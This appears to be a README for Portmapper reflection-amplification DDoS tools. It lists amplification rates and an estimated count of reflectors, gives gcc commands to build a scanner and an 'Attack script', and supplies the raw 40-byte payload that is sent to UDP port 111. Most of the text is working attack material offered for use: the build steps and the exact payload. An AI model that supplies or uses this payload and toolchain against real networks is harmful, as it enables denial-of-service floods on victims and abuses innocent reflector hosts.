# Portmap
Portmap amplification dev

This is for Portmap amplification.

Average amplification rate: 7x - 28x (maximum of 200x has been observed)
Estimated amount of reflectors: 4 million

http://blog.level3.com/security/a-new-ddos-reflection-attack-portmapper-an-early-warning-to-the-industry/

Compile scanner: gcc PortmapScan.c -pthread -o PortmapScan
Compile Attack script: gcc Portmap.c -pthread -o Portmap

Payload: \x65\x72\x0A\x37\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

Port: 111

Payload Size: 40
